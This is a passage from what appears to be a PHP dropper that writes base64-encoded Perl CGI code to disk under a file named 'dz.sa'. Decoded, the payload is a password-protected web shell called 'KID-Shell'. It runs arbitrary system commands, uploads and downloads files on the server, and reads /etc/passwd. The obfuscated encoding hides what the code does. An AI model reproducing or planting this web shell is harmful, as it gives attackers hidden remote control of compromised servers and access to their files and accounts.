ByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiPGNvZGU+RmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCE8L2NvZGU+IjsNCgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQ0KIyB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rIHRocm91Z2ggd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsDQojIHRoZSBmaWxlIGlzIHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJJlByaW50RmlsZVVwbG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQlwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCXByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlwcmludCAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCXByaW50ICI8L2NvZGU+IjsNCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRG93bmxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlyZXR1cm47DQoJfQ0KDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpICMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kDQp7DQoJJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCSZEb3dubG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAjIHVzZXIgd2FudHMgdG8gbG9nb3V0DQp7DQoJJlBlcmZvcm1Mb2dvdXQ7DQp9DQoNCg0K');
$write = fwrite ($file ,$sa);
$file = fopen($dir."dkcgi/dz.sa" ,"w+");
$sa=base64_decode('IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQokTlRDbWRTZXAgPSAiJiI7DQokVW5peENtZFNlcCA9ICI7IjsNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMzAwOw0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsNCiRwYXNzd29yZCA9ICJkayI7DQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIGZvbw0KICAgIHsNCiAgICAgICAgbXkgKCAkbG9naW4sICRwLCAkdWlkLCAkZ2lkLCAkZ2Vjb3MsICRkaXIsICRzICk7DQogICAgIA0KICAgICAgICBteSAlSG9IID0gKCk7DQogICAgIA0KICAgICAgICBteSAkZmlsZSA9ICcvZXRjL3Bhc3N3ZCc7DQogICAgICAgIG9wZW4oIFBBU1NXRCwgIjwgJGZpbGUiICkgb3IgZGllICJDYW4ndCBvcGVuICRmaWxlIDogJCEiOw0KICAgICANCiAgICAgICAgd2hpbGUoIDxQQVNTV0Q+ICkgew0KICAgICAgICAgICAgKCAkbG9naW4sICRwLCAkdWlkLCAkZ2lkLCAkZ2Vjb3MsICRkaXIsICRzICkgPSBzcGxpdCggJzonICk7DQogICAgIA0KICAgICAgICAgICAgJEhvSHsgJGxvZ2luIH17ICd1aWQnIH0gPSAkdWlkOw0KICAgICAgICAgICAgJEhvSHsgJGxvZ2luIH17ICdnaWQnIH0gPSAkZ2lkOw0KICAgICAgICAgICAgJEhvSHsgJGxvZ2luIH17ICdkaXInIH0gPSAkZGlyOw0KICAgICAgICB9DQogICAgIA0KICAgICAgICBjbG9zZSBQQVNTV0Q7DQogICAgIA0KICAgICAgICByZXR1cm4gXCVIb0g7DQogICAgfQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPktJRCAtIERyLkpFZU5UZUwgU2hlTEw8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8Ym9keSBzdHlsZT0nY29sb3I6ICMwMDAwMDA7YmFja2dyb3VuZDp1cmwoaHR0cDovL2R6NGFsbC5jb20vY2MvaW1hZ2VzL2FsbWphemYtc2EvbmF2L25hdl8xOC5naWYpIHJlcGVhdCBzY3JvbGwgY2VudGVyIHRvcDtiYWNrZ3JvdW5kLWF0dGFjaG1lbnQ6IGZpeGVkO1NDUk9MTEJBUi1GQUNFLUNPTE9SOiAjRjFGMUYxOyBNQVJHSU46IDBweDtTQ1JPTExCQVItSElHSExJR0hULUNPTE9SOiAjZmZmZmZmOyBPVkVSRkxPVzogYXV0bzsnPg0KPHRkIGNvbHNwYW49IjIiIGJnY29sb3I9IiMwMGZmMDAiPjxwIGFsaWduPSJjZW50ZXIiPnM8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+RG93bmxvYWQgRmlsZTwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPg0KPHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8cCBhbGlnbj0iY2VudGVyIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIzIiBjb2xvcj0iI0ZGMDAwMCI+S0lELVNoZWxsIC0gU2VydmVyOjogIDxmb250IGNvbG9yPSIjMDBGRjAwIj4kU2VydmVyTmFtZTwvZm9udD48L2ZvbnQ+DQo8L3RyPg0KPHRyPg0KPC9mb250PjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjMDBmZjAwIj4NCiAgICAgIC0tIEVudGVyIFBhc3N3b3JkIC0tDQo8L2ZvbnQ+PC9wcmU+DQokOw0KIycNCglwcmludCA8PEVORDsNCiRNZXNzYWdlDQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGJyPmxvZ2luOiBhZG1pbjxicj4NCnBhc3N3b3JkOjxicj4NCkxvZ2luIGluY29ycmVjdDxicj48YnI+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5Gb3JtDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj48Zm9udCBjb2xvcj0iIzAwZmYwMCI+UGFzc3dvcmQgOiA8L2ZvbnQ+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0DQojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0DQojIG1hdGNoIG9yIGlmIG5vIHBhc3N3b3JkIGlzIGVudGVyZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlcg0KIyB0byBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0